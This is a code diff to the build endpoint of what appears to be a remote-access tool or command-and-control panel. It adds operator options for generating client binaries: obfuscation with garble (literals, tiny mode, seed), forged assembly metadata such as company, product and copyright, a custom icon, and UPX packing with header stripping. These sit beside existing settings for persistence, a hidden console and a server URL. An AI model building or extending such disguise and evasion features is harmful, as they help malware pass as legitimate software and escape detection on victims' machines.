@@ -52,6 +52,18 @@ export async function handleBuildRoutes(
         disableMutex,
         hideConsole,
         noPrinting,
+        outputName,
+        garbleLiterals,
+        garbleTiny,
+        garbleSeed,
+        assemblyTitle,
+        assemblyProduct,
+        assemblyCompany,
+        assemblyVersion,
+        assemblyCopyright,
+        iconBase64,
+        enableUpx,
+        upxStripHeaders,
       } = body;
 
       if (!platforms || !Array.isArray(platforms) || platforms.length === 0) {
@@ -119,6 +131,21 @@ export async function handleBuildRoutes(
         typeof persistenceMethod === 'string' && VALID_PERSISTENCE_METHODS.has(persistenceMethod.toLowerCase())
           ? persistenceMethod.toLowerCase()
           : 'startup';
+      const safeOutputName = typeof outputName === "string" && /^[A-Za-z0-9._-]{1,64}$/.test(outputName.trim())
+        ? outputName.trim()
+        : undefined;
+      const safeGarbleSeed = typeof garbleSeed === "string" && /^[A-Za-z0-9]{1,64}$/.test(garbleSeed.trim())
+        ? garbleSeed.trim()
+        : undefined;
+      const safeAssemblyVersion = typeof assemblyVersion === "string" && /^\d{1,5}\.\d{1,5}\.\d{1,5}\.\d{1,5}$/.test(assemblyVersion.trim())
+        ? assemblyVersion.trim()
+        : undefined;
+      const safeStr = (val: any, max = 128) =>
+        typeof val === "string" && val.trim().length > 0 ? val.trim().slice(0, max) : undefined;
+      const safeIconBase64 = typeof iconBase64 === "string" && iconBase64.length > 0 && iconBase64.length <= 2 * 1024 * 1024
+        ? iconBase64
+        : undefined;
+
       deps.startBuildProcess(buildId, {
         platforms: allowedPlatforms,
         serverUrl: safeServerUrl,
@@ -133,6 +160,18 @@ export async function handleBuildRoutes(
         hideConsole: !!hideConsole,
         noPrinting: safeNoPrinting,
         builtByUserId: user.userId,
+        outputName: safeOutputName,
+        garbleLiterals: !!garbleLiterals,
+        garbleTiny: !!garbleTiny,
+        garbleSeed: safeGarbleSeed,
+        assemblyTitle: safeStr(assemblyTitle),
+        assemblyProduct: safeStr(assemblyProduct),
+        assemblyCompany: safeStr(assemblyCompany),
+        assemblyVersion: safeAssemblyVersion,
+        assemblyCopyright: safeStr(assemblyCopyright),
+        iconBase64: safeIconBase64,
+        enableUpx: !!enableUpx,
+        upxStripHeaders: !!upxStripHeaders,
       });
 
       return Response.json({ buildId });
@@ -141,7 +180,7 @@ export async function handleBuildRoutes(
     if (req.method === "GET" && url.pathname === "/api/build/list") {
       requirePermission(user, "clients:build");
 
-      const builds = getAllBuilds();
+      const builds = getAllBuilds(user.userId, user.role);
       return Response.json({ builds });
     }
 
